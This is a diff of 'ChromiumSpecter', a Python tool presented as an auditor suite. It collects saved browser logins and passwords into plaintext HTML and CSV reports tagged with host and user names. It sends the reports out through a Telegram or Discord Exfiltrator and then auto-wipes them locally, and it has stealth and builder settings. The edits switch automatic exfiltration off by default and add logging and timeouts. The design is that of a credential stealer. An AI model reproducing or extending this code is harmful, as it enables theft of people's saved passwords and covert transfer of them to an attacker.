@@ -1,3 +1,19 @@
+# 🛡️ ChromiumSpecter — Tactical Auditor Suite
+# Copyright (C) 2026 ANONIMO432HZ
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <https://fsf.org/licenses/>.
+
 import os
 import sys
 import json
@@ -28,7 +44,7 @@ CONFIG = {
     "tg_chat_id": "",  
     "ds_webhook": "",  
     "stealth":       False,
-    "auto_exfil":    True,
+    "auto_exfil":    False,
     "output_dir":    ".audit",
     "delay":         1,
     "send_delay":    2,
@@ -541,30 +557,41 @@ class ChromiumDecryptor:
         if not data and not filtered:
             return None, None, None
 
+        # ── Generación de Reportes ────────────────────────────────────────────
         stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
         c_p = output_dir / f"audit_report_{stamp}.csv" if not skip_csv else None
 
+        # Obtención segura de metadatos para evitar cuelgues en redes complejas
+        try: hname = socket.gethostname()
+        except: hname = os.environ.get("COMPUTERNAME", "Unknown")
+        try: uname = getpass.getuser()
+        except: uname = os.environ.get("USERNAME", "Unknown")
+
         if h_p:
+            log(f"Generando reporte HTML: {h_p.name}...", "info")
             r_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in data])
             f_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in filtered])
             f_s = f'<h2 style="margin-top:40px;color:#e67e22;border-bottom:2px solid #e67e22;">Entradas Filtradas</h2><table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{f_h}</tbody></table>' if filtered else ""
             content = (HTML_TEMPLATE.replace("{{total}}", str(len(data))).replace("{{filtered_count}}", str(len(filtered)))
-                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", socket.gethostname())
-                       .replace("{{username}}", getpass.getuser()).replace("{{pid}}", str(os.getpid()))
+                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", hname)
+                       .replace("{{username}}", uname).replace("{{pid}}", str(os.getpid()))
                        .replace("{{version}}", __version__).replace("{{rows}}", r_h).replace("{{filtered_section}}", f_s)
                        .replace("{{skipped_note}}", f" ({len(filtered)} filtrados)" if filtered else ""))
             with open(h_p, "w", encoding='utf-8') as f: f.write(content)
 
         if c_p:
+            log(f"Generando reporte CSV: {c_p.name}...", "info")
             with open(c_p, 'w', newline='', encoding='utf-8') as f:
                 w = csv.writer(f)
-                w.writerow([f"# Reporte Auditoria | Host: {socket.gethostname()} | User: {getpass.getuser()} | Ver: {__version__}"])
+                w.writerow([f"# Reporte Auditoria | Host: {hname} | User: {uname} | Ver: {__version__}"])
                 w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                 w.writerows(data)
                 if filtered:
                     w.writerow([]); w.writerow(["# --- FILTRADOS ---"])
                     w.writerows(filtered)
+        
+        log("Auditoría completada exitosamente.", "info")
         return (data + filtered), h_p, c_p
 
 def main():
@@ -624,10 +651,12 @@ def main():
     
     # auto_exfil puede ser desactivado desde el CONFIG embebido (Builder) o con --no-exfil
     if results and not args.no_exfil and CONFIG["auto_exfil"]:
-        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
+        # Timeout robusto de 15s para red, no vinculado al delay de ejecución
+        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=CONFIG.get("webhook_timeout", 15))
         # Incluir JSON en los archivos a enviar si existe
         files = [p for p in (hp, cp, (jp if results and args.json else None)) if p and p.exists()]
         if files:
+            logger.info(f"Iniciando exfiltración de {len(files)} archivos...")
             exf.send_files(files)
             # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
             if not args.no_wipe and (tg_t or ds_w):
